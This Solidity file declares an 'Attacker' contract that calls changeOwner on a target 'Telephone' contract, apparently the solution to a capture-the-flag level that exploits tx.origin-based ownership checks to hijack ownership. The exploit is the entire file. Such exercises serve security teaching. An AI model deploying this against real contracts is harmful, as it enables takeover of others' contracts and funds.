// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
   function changeOwner(address _owner) external;
}

contract Attacker {
    function claimOwnerShip(address _targetAddress) public {
        Telephone target = Telephone(_targetAddress);
        target.changeOwner(msg.sender);
    }
}
